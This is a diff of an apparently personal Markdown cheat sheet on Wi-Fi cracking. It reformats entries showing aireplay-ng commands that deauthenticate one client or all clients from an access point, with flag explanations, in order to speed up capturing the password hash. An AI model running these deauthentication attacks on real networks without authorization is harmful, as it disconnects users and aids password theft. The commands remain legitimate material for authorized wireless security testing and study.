@@ -28,13 +28,15 @@
 
 ## aireplay-ng(force the clients to deauth to speed up the process of getting the passwd hash)
   
-  ### deauthenticate specific client: `sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon`
+  ### deauthenticate specific client:
+  - example use: `sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon`
 
   - `--deauth 10`: Sends 10 deauthentication packets.
   - `-a 00:11:22:33:44:55`: The MAC address of the access point.
   - `-c AA:BB:CC:DD:EE:FF`: The MAC address of the client to deauthenticate.
 
-  ### deauthenticate all clients: `sudo aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0mon`
+  ### deauthenticate all clients:
+  - example use: `sudo aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0mon`
 
   - `--deauth 0`: Sends deauthentication packets continuously (0 means infinite).
   - `-a 00:11:22:33:44:55`: The MAC address of the target access point.
